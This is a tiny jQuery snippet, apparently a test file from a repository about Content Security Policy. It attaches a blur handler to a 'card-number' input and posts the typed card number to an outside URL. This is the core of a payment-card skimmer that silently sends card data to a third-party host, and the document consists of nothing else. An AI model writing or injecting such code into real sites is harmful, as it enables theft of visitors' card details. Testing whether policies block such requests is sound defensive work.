$("#card-number").on('blur', function() {
  $.post( "https://github.com/mmiesiak/csp/edit/master/test.html", { name: $(this).val() } );
});
